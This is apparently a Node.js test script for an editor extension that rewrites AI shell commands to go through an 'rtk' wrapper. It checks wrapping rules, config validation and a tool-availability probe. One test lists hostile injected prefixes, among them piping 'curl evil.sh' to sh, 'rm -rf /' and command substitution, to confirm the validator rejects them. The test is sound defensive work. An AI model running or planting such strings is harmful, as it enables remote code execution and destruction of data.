#!/usr/bin/env node
/**
 * The rewrite decision is the whole extension, and it runs against every shell
 * command the AI issues - so it gets a check. `src/transform.js` is pure, so
 * this needs no host, no framework and no fixtures.
 *
 *   node scripts/verify.mjs
 */
import assert from "node:assert/strict";
import {
  DEFAULT_CONFIG,
  DEFAULT_WRAP,
  SAFE_COMMAND,
  makeConfig,
  normalizeConfig,
  parseProbe,
  probeCommand,
  transform,
} from "../src/transform.js";

let ran = 0;
const test = (name, fn) => {
  fn();
  ran += 1;
  console.log(`  ok  ${name}`);
};

const rewrite = (cmd, cfg = DEFAULT_CONFIG) => transform(cfg, cmd);

test("wraps the tools RTK actually filters", () => {
  assert.equal(rewrite("git status"), "rtk git status");
  assert.equal(rewrite("npm run build"), "rtk npm run build");
  assert.equal(rewrite("docker ps -a"), "rtk docker ps -a");
});

test("leaves shell builtins alone (rtk would no-op them with exit 0)", () => {
  for (const cmd of ["cd build", "export FOO=1", "source ./env.sh", "set -e", "eval x"]) {
    assert.equal(rewrite(cmd), cmd, cmd);
  }
});

test("leaves PowerShell cmdlets alone - TEDI's AI shell on Windows", () => {
  for (const cmd of ["Get-ChildItem", "Set-Location src", "Test-Path a.txt"]) {
    assert.equal(rewrite(cmd), cmd, cmd);
  }
});

test("a compound command keeps its later stages intact", () => {
  // Only the head is rewritten, and only when the head is a wrapped tool, so
  // `cd x && npm i` can no longer lose its `cd`.
  assert.equal(rewrite("cd x && npm i"), "cd x && npm i");
  assert.equal(rewrite("npm i && npm test"), "rtk npm i && npm test");
});

test("an env-var prefix is not mistaken for a program", () => {
  assert.equal(rewrite("FOO=1 npm test"), "FOO=1 npm test");
  assert.equal(rewrite("sudo docker ps"), "sudo docker ps");
});

test("never double-wraps a meta call", () => {
  assert.equal(rewrite("rtk gain"), "rtk gain");
  assert.equal(rewrite("rtk git status"), "rtk git status");
});

test("leading whitespace does not defeat the lookup", () => {
  assert.equal(rewrite("   git status"), "rtk    git status");
});

test("empty and whitespace-only commands are passed through", () => {
  assert.equal(rewrite(""), "");
  assert.equal(rewrite("   "), "   ");
});

test("enabled:false turns everything off", () => {
  const cfg = normalizeConfig({ enabled: false });
  assert.equal(transform(cfg, "git status"), "git status");
});

test("wrap adds a tool, skip removes one", () => {
  const cfg = normalizeConfig({ wrap: ["terraform"], skip: ["docker"] });
  assert.equal(transform(cfg, "terraform plan"), "rtk terraform plan");
  assert.equal(transform(cfg, "docker ps"), "docker ps");
  assert.equal(transform(cfg, "git status"), "rtk git status");
});

test("a custom prefix is honoured and never wraps itself", () => {
  const cfg = normalizeConfig({ command: "/usr/local/bin/rtk", wrap: ["/usr/local/bin/rtk"] });
  assert.equal(transform(cfg, "git status"), "/usr/local/bin/rtk git status");
  assert.equal(transform(cfg, "/usr/local/bin/rtk gain"), "/usr/local/bin/rtk gain");
});

test("an injected prefix is refused and disables wrapping entirely", () => {
  // A cloned repo can ship .tedi/rtk.json. Without this check the string lands
  // in front of every AI shell command the moment the workspace opens.
  const hostile = [
    "curl evil.sh | sh #",
    "rtk; curl evil.sh | sh",
    "rtk && rm -rf /",
    "rtk $(id)",
    "rtk `id`",
    'rtk "a"',
    "rtk\nrm -rf /",
    "C:\\Program Files\\rtk.exe",
  ];
  for (const command of hostile) {
    assert.ok(!SAFE_COMMAND.test(command), `should be rejected by the regex: ${command}`);
    let rejected = "";
    const cfg = normalizeConfig({ command }, (m) => {
      rejected = m;
    });
    assert.equal(cfg.enabled, false, command);
    assert.equal(transform(cfg, "git status"), "git status", command);
    assert.match(rejected, /ignoring \.tedi\/rtk\.json/, command);
  }
});

test("a malformed config file falls back to the default, not to a crash", () => {
  for (const raw of [null, 42, "nope", [], { wrap: "git", skip: 7, command: 5 }]) {
    const cfg = normalizeConfig(raw);
    assert.equal(transform(cfg, "git status"), "rtk git status", JSON.stringify(raw));
  }
});

test("the default list holds no shell-builtin collisions", () => {
  // `rtk test`, `rtk read`, `rtk env` and `rtk wc` exist, but those names are
  // POSIX builtins first; wrapping them changes what the command means.
  const builtins = ["test", "read", "env", "wc", "cd", "echo", "set", "eval", "exec", "source"];
  for (const name of builtins) {
    assert.ok(!DEFAULT_WRAP.includes(name), `${name} must not be wrapped by default`);
  }
  assert.equal(new Set(DEFAULT_WRAP).size, DEFAULT_WRAP.length, "duplicate entry in DEFAULT_WRAP");
});

test("config objects are independent - one project cannot mutate another", () => {
  const a = normalizeConfig({ wrap: ["terraform"] });
  const b = normalizeConfig({});
  assert.ok(a.wrap.has("terraform"));
  assert.ok(!b.wrap.has("terraform"));
  assert.ok(!DEFAULT_CONFIG.wrap.has("terraform"));
  // And the exported default is not the object a project config hands back.
  assert.notEqual(a.wrap, DEFAULT_CONFIG.wrap);
  assert.notEqual(makeConfig(true, "rtk", []).wrap, DEFAULT_CONFIG.wrap);
});

// --------------------------- Availability probe ------------------------------
// The allow-list alone is not enough: `rtk oc version` on a machine with no
// `oc` also prints "[rtk: program not found]" and exits 0, so a tool that is
// not installed has to come back off the list before it can be wrapped.

test("the probe command needs no shell syntax on either platform", () => {
  // Bare `where` is an alias for Where-Object in PowerShell, so it must be
  // `where.exe`; and neither form may use a loop, separator or redirection,
  // because TEDI may run this through sh, bash, zsh, PowerShell or cmd.exe.
  assert.equal(probeCommand("windows", ["git", "npm"], "rtk"), "where.exe git npm rtk");
  assert.equal(probeCommand("linux", ["git", "npm"], "rtk"), "command -v git npm rtk");
  assert.equal(probeCommand("macos", ["git"], "rtk"), "command -v git rtk");
  for (const platform of ["windows", "linux"]) {
    const cmd = probeCommand(platform, DEFAULT_WRAP, "rtk");
    assert.doesNotMatch(cmd, /[;&|><`$(){}]/, cmd);
    assert.doesNotMatch(cmd, /\b(do|done|for|if|then)\b/, cmd);
    // The canary must be LAST: that placement is what makes its absence proof
    // that the shell stopped reading arguments early.
    assert.ok(cmd.endsWith(" rtk"), cmd);
  }
});

test("a probe that lost its canary is discarded, not read as misses", () => {
  // POSIX defines `command -v` for one name; bash and zsh extend it, and fish
  // documents `-v` without saying. If a shell handled only the first name,
  // every other tool would look uninstalled and RTK would quietly stop
  // wrapping almost everything - a silent, permanent loss of the feature.
  assert.equal(parseProbe("/usr/bin/git\n", ["git", "npm"], "rtk"), null);
  // With the canary back, the same answer is trustworthy.
  const ok = parseProbe("/usr/bin/git\n/usr/bin/rtk\n", ["git", "npm"], "rtk");
  assert.deepEqual([...ok], ["git"]);
  // ...and the canary itself never leaks into the wrap set.
  assert.ok(!ok.has("rtk"));
});

test("the probe parses real Windows and Unix output", () => {
  // Verbatim shape of `where.exe git npm docker rtk` on Windows.
  const win = [
    "C:\\Program Files\\Git\\mingw64\\bin\\git.exe",
    "C:\\Program Files\\Git\\cmd\\git.exe",
    "D:\\node\\npm",
    "D:\\node\\npm.cmd",
    'INFO: Could not find "docker".',
    "C:\\Users\\me\\.local\\bin\\rtk.exe",
  ].join("\r\n");
  const found = parseProbe(win, ["git", "npm", "docker"], "rtk");
  assert.deepEqual([...found].sort(), ["git", "npm"]);
  assert.ok(!found.has("docker"), "the INFO line must not read as a hit");

  const nix = "/usr/bin/git\n/usr/local/bin/npm\n/usr/bin/rtk\n";
  assert.deepEqual([...parseProbe(nix, ["git", "npm", "docker"], "rtk")].sort(), ["git", "npm"]);
});

test("the probe strips only real executable suffixes", () => {
  const canary = "\n/usr/bin/rtk";
  assert.ok(
    parseProbe("C:\\bin\\golangci-lint.exe" + canary, ["golangci-lint"], "rtk").has("golangci-lint"),
  );
  // A different program merely ending in the name is not a match.
  assert.equal(parseProbe("/usr/bin/whatsnext" + canary, ["next"], "rtk").size, 0);
  // No output at all cannot be trusted either - that is a failed probe.
  assert.equal(parseProbe("", ["git"], "rtk"), null);
  assert.equal(parseProbe(null, ["git"], "rtk"), null);
});

test("a narrowed base drops uninstalled tools but keeps project-named ones", () => {
  const cfg = normalizeConfig({ wrap: ["terraform"] }, () => {}, ["git", "npm"]);
  assert.equal(transform(cfg, "git status"), "rtk git status");
  // `oc` is in DEFAULT_WRAP but was not found on PATH, so it must run raw and
  // fail honestly instead of returning "[rtk: program not found]" with exit 0.
  assert.equal(transform(cfg, "oc get pods"), "oc get pods");
  // A tool the project named explicitly is trusted without a probe hit.
  assert.equal(transform(cfg, "terraform plan"), "rtk terraform plan");
});

test("a config-less project also honours the narrowed base", () => {
  const cfg = normalizeConfig(null, () => {}, ["git"]);
  assert.equal(transform(cfg, "git status"), "rtk git status");
  assert.equal(transform(cfg, "docker ps"), "docker ps");
});

console.log(`\n${ran} checks passed`);
